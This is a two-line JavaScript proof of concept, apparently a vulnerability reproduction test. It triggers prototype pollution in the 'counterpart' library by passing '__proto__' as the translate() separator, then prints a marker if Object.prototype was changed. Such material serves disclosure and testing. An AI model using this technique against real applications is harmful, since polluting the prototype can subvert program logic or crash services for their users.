require("counterpart").translate('polluted', { separator: '__proto__' })
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '');